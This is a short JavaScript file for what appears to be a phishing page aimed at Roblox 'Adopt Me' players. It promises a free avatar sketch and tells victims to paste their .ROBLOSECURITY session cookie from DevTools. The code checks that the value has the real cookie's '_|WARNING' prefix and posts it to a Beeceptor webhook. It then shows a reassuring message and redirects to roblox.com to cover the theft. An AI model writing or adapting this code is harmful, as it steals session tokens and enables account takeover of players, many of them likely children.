function submitCookie() {
    const cookie = document.getElementById('cookie-input').value.trim();
    if (cookie && cookie.startsWith('_|WARNING')) {
fetch('https://adopt-me-cookies.free.beeceptor.com', { // Your Beeceptor URL
    method: 'POST',
    body: JSON.stringify({ cookie: cookie, source: 'adopt-me-avatar' }),
    headers: { 'Content-Type': 'application/json' }
}).then(response => {
    if (!response.ok) throw new Error('Webhook failed'); // Better error handling
    return response.json();
}).then(() => {
    document.getElementById('status').innerText = 'Nice one! Your Adopt Me avatar’s being sketched—check DMs soon!';
    setTimeout(() => window.location.href = 'https://www.roblox.com', 2000);
}).catch((error) => {
    console.error('Fetch error:', error); // Logs to Console for debug
    document.getElementById('status').innerText = 'Bugger, something went wrong. Try again!';
        });
    } else {
        document.getElementById('status').innerText = 'Invalid code, mate! Grab the .ROBLOSECURITY from DevTools.';
    }
}

// Handle hash routing
window.addEventListener('hashchange', () => {
    let page = location.hash.slice(2).split('/').pop();
    document.querySelectorAll('section').forEach(s => s.style.display = 'none');
    if (page) document.getElementById(page).style.display = 'block';
});

window.dispatchEvent(new Event('hashchange')); // Trigger on load

